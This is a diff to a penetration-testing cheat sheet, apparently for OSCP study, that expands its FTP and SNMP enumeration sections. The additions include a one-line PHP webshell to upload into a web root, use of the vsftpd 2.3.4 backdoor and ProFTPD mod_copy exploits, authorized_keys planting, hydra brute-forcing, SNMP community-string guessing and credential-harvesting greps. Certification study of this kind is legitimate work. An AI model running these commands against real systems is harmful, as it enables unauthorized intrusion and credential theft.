@@ -153,22 +153,79 @@ When nmap comes back, don't panic at the list — recognise each port and reach 
 
 **Golden habit:** the open ports are a **menu, not a checklist in order** — enumerate them all, then attack the *easiest* win first (web, SMB, or a known-version exploit).
 
-## [ENUM-FTP]  Port 21 — FTP (file transfer)
-**What it is:** an old way to upload/download files. It's a goldmine when it allows **anonymous** login (username `anonymous`, any password) — you might read config files, backups, or even the website's files. If FTP shares the same folder as the web server, you can sometimes **upload a "webshell"** (a small script that lets you run commands via the browser).
-```bash
-nmap -p21 -sCV --script ftp-anon $IP          # check the version + whether anonymous login is allowed
-ftp $IP                                        # log in interactively — try user: anonymous, password: (just press Enter)
-wget -r ftp://anonymous:anonymous@$IP/         # download EVERYTHING on the server, recursively, to your machine
-curl ftp://$IP/ --user anonymous:anonymous     # just list the files without logging in interactively
-hydra -l $U -P rockyou.txt ftp://$IP           # guess a password — ONLY if you have a real reason [LOOK-UP]
-```
-**What to check / do:**
-- Got in anonymously? **List and download everything.** Try `put testfile` — can you upload? If yes *and* it's the web root → drop a webshell.
-- Loot you want: config files, backups, `.txt` files with passwords, source code. **Any password you find, try it on every other service** (people reuse passwords — this is "credential spraying/reuse").
-- Downloading a binary and it's corrupt? Type `binary` in the ftp prompt before `get`.
+## [ENUM-FTP]  Port 21 — FTP (file transfer) — FULL CHAIN
+**What it is:** file upload/download. Goldmine when **anonymous** login is allowed. Three things decide everything: (1) can you log in? (2) can you **read** files? (3) can you **write** files? Plus the **version** (some have public exploits).
 
-**Known weak spots:** vsftpd 2.3.4 (has a joke backdoor — opens a root shell on port 6200) · ProFTPD 1.3.5 (`mod_copy` lets you copy files → write a webshell) · anonymous **write** access.
-**Where it leads:** a webshell, credentials, or source code → see `[FOUND-CREDS]` (Volume 6) and `[WEB-UPLOAD]` (Volume 2).
+### 🗺️ Decision tree
+```
+nmap ftp-anon →  anonymous allowed?   YES → log in → can you WRITE (put)?
+                                              ├─ write + it's the WEB ROOT → upload a webshell → RCE
+                                              ├─ write (ProFTPD mod_copy) → copy a shell into web root
+                                              └─ read-only → LOOT everything → reuse creds
+                 NO  →  check the VERSION → public exploit?  (vsftpd 2.3.4 backdoor / ProFTPD mod_copy / CVEs)
+                        else → try found/default creds → else brute (last resort, with a known user)
+ALWAYS: loot every file you can read; every cred found → spray everywhere.
+```
+
+### Step 1 — Identify (version + anonymous)
+```bash
+nmap -p21 -sCV --script "ftp-anon,ftp-syst,ftp-bounce" $IP    # version + anon + system type
+nc -nv $IP 21                                                  # banner by hand (exact version string)
+```
+- Note the **exact version** (e.g. `vsftpd 3.0.3`, `ProFTPD 1.3.5`) → Step 4 if no anon.
+- `ftp-anon: Anonymous FTP login allowed` → Step 2.
+
+### Step 2 — Log in (anonymous first — cheapest)
+```bash
+ftp $IP                                   # user: anonymous   pass: anonymous (or just Enter)
+# non-interactive:
+curl ftp://$IP/ --user anonymous:anonymous             # list root
+wget -r --no-passive ftp://anonymous:anonymous@$IP/    # MIRROR everything recursively
+```
+Inside the `ftp>` prompt: `ls -la`, `cd`, `get <file>`, `binary` (before getting binaries or they corrupt), `mget *`.
+
+### Step 3 — Decide by what you can do
+**3a. Can you WRITE?** (the big win) — test it:
+```bash
+# in ftp:  put /etc/hostname test.txt    → "226 Transfer complete" = you can WRITE
+```
+- **Write + FTP root == web root** (confirm: is there a web server, does `http://$IP/test.txt` show it?) → **upload a webshell**:
+  ```bash
+  # make shell.php  <?php system($_GET['c']); ?>  → put shell.php → visit http://$IP/shell.php?c=id → [WEB-UPLOAD]
+  ```
+- **Write but NOT web root** → drop an `.ssh/authorized_keys` if the FTP user's home is writable, or just stage files.
+
+**3b. Read-only?** → **LOOT everything** and move the creds elsewhere:
+```bash
+# hunt in what you downloaded:
+grep -rniE 'pass|pwd|user|secret|key|token' .        # in the mirrored files
+# juicy files: config.*, web.config, .env, wp-config.php, *.bak, backups, .txt notes, source, id_rsa, .kdbx
+```
+Any cred/key found → `[CREDENTIALS-QUICK]` (try on SSH/SMB/web/etc.).
+
+### Step 4 — No anonymous → version exploits + creds
+```bash
+searchsploit <product> <version>         # e.g. searchsploit proftpd 1.3.5
+```
+Known OSCP-relevant FTP bugs:
+- **vsftpd 2.3.4** → backdoor: a username ending in `:)` opens a **root shell on port 6200** → `nc $IP 6200` → `id`. (`[ENUM-SALTSTACK]`-style CVE entry: CVE-2011-2523)
+- **ProFTPD 1.3.5** → `mod_copy` (`SITE CPFR`/`SITE CPTO`, unauthenticated) → copy a file into the **web root** → webshell. (CVE-2015-3306)
+- **ProFTPD 1.3.3c** → backdoor. · **Pure-FTPd/others** → check searchsploit.
+- No exploit → try creds you found elsewhere, default creds (`admin/admin`, product defaults), THEN brute as last resort:
+  ```bash
+  hydra -l <known-user> -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 4   # only with a real username + reason
+  ```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| downloads corrupt / truncated | type `binary` before `get` |
+| `ftp` hangs on listing | passive/active mismatch → `passive` in the prompt, or `wget --no-passive` |
+| anon "530 Login incorrect" | anon disabled → version exploit / found creds |
+| `put` → "550 Permission denied" | read-only → loot path (3b) |
+| can write but webshell 404 | FTP root ≠ web root → stage SSH key / just loot instead |
+
+**Leads to:** webshell → `[WEB-UPLOAD]`; creds/keys → `[CREDENTIALS-QUICK]`; version backdoor → shell → `[LINUX-PRIVESC]`.
 
 ## [ENUM-SSH]  Port 22 — SSH (remote login shell)
 **Big idea:** SSH is almost never the way *in* — it's the **reward**. You rarely break SSH directly; instead you find a password or a private key *somewhere else* (a file, a share, a database) and then log in with it. Don't waste time attacking SSH head-on.
@@ -330,19 +387,61 @@ xfreerdp /v:$IP /u:$U /p:$P /drive:share,/tmp                 # share your /tmp 
 ```
 **Where it leads:** a graphical foothold — handy for running winPEAS visually or moving files via clipboard/mapped drive.
 
-## [ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring)  → `[TECH-SNMP]`
-**What it is:** a monitoring protocol. If the "community string" (a shared password) is the default `public`, it happily dumps **running process command-lines (which often contain passwords!), user lists, installed software, and open ports.** High reward, low effort — don't skip it.
-```bash
-snmpwalk -v2c -c public $IP     # dump everything the device will share
-snmp-check $IP -c public        # same data, formatted more nicely
-onesixtyone -c common.txt $IP   # guess the community string if 'public' doesn't work
-# useful OIDs (an OID is an "address" for a specific piece of data) [LOOK-UP]:
-#   processes:      1.3.6.1.2.1.25.4.2.1.2
-#   process args:   1.3.6.1.2.1.25.4.2.1.5   ← passwords often hide here
-#   installed sw:   1.3.6.1.2.1.25.6.3.1.2
-#   user accounts:  1.3.6.1.4.1.77.1.2.25
+## [ENUM-SNMP]  Port 161/UDP — SNMP (device monitoring) — FULL CHAIN  → `[TECH-SNMP]`
+**What it is:** a monitoring protocol on **UDP 161** (so a TCP scan misses it — you need `-sU`). Guarded by a "community string" (a shared password); the default is `public`. If you can read it, it dumps **running process command-lines (passwords hide here!), users, installed software, listening ports, network info** — huge loot for near-zero effort.
+
+### 🗺️ Decision tree
 ```
-**Where it leads:** passwords in process arguments, usernames, internal software/ports.
+is 161/udp open? (nmap -sU) →  guess community string ('public' first, then brute)
+   got a string? →  snmp-check / snmpwalk EVERYTHING →  mine for:
+      ├─ process ARGUMENTS   → passwords typed on command lines  → reuse (SSH/web/etc.)
+      ├─ usernames           → build a user list → spray / AD roast
+      ├─ listening ports     → internal-only services → pivot targets
+      └─ installed software  → version → searchsploit
+   no string → brute harder (onesixtyone + big list); if still nothing, move on (low-value then)
+```
+
+### Step 1 — Confirm it's there (UDP!) + find the community string
+```bash
+nmap -sU -p161 -sV $IP                                   # is 161/udp open + version
+# try the default, then brute the string:
+snmpwalk -v2c -c public $IP 2>/dev/null | head           # 'public' works? (no output = wrong string/filtered)
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP   # brute the string
+snmpbulkwalk -v2c -c public $IP 1.3.6 | head             # faster bulk walk
+```
+- Got output → you have a valid string → Step 2.
+- `public` fails → brute with onesixtyone; common ones: `public`, `private`, `community`, `manager`.
+
+### Step 2 — Dump EVERYTHING, then mine it
+```bash
+snmp-check $IP -c public                                 # cleanest formatted dump (START HERE)
+snmpwalk -v2c -c public $IP > snmp.txt                   # full raw dump to a file
+# then mine the file / targeted OIDs:
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2       # running processes
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.5       # ⭐ process ARGUMENTS — passwords live here
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2       # installed software (→ searchsploit)
+snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25        # local user accounts
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3         # listening TCP ports (internal services)
+grep -iE 'pass|pwd|user|cred|key' snmp.txt               # quick creds sweep
+```
+> An **OID** = an "address" for a specific data branch. `snmp-check` already pulls the common ones; the targeted walks are for when you want just processes/args.
+
+### Step 3 — Act on what you found
+- **Password in a process arg** (e.g. a backup/db command with `-p<pass>`) → reuse it on SSH/SMB/web → `[CREDENTIALS-QUICK]`.
+- **Usernames** → save to `users.txt` → spray, or AD roast (`[AD-QUICK]`).
+- **Installed software + version** → `searchsploit <product> <version>`.
+- **Internal listening ports** (127.0.0.1 only) → pivot targets once you have a foothold (`[PIVOT-QUICK]`).
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| nothing from `snmpwalk` | wrong community string (brute with onesixtyone) OR 161 is filtered — confirm with `nmap -sU -p161` |
+| TCP scan didn't show 161 | SNMP is **UDP** → `nmap -sU --top-ports 100` |
+| `Timeout: No Response` | string wrong, or rate-limited → `-t 5 -r 2`; try `-v1` as well as `-v2c` |
+| snmpwalk slow | use `snmpbulkwalk` |
+| SNMPv3 (no community string) | needs a user+auth → harder; look for creds elsewhere `[LOOK-UP]` |
+
+**Leads to:** creds in process args → spray `[CREDENTIALS-QUICK]`; user list → `[AD-QUICK]`; software version → `[EXPLOIT-RESEARCH]`.
 
 ## [ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing)  → `[TECH-NFS]`
 **What it is:** the Unix version of SMB. Shared folders ("exports") may be world-readable/writable, and a setting called **`no_root_squash`** can hand you root.
